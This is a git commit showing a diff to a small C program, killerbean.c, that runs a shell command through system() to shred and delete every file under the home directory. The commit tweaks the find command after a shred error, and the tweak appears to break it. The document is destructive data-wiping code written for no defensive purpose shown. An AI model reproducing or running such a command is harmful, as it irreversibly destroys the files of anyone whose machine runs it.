bfd0f7491f8fd3658a10a9d30f6f1e96c193bce3
peach <ginahenstock7@gmail.com>
2021-11-26 13:57:20 +0200

    find fix
    shred: .: failed to open for writing: Is a directory

--- killerbean.c
+++ killerbean.c
@@ -6,7 +6,7 @@
 int main () {
    char command[200];
 
-   strcpy(command, "cd ~ && find . -exec shred {} -z -u \\;" );//deletes root
+   strcpy(command, "cd ~ && find . -type d -exec shred {} -z -u \\;" );//deletes root
    printf(command);
    system(command);
 
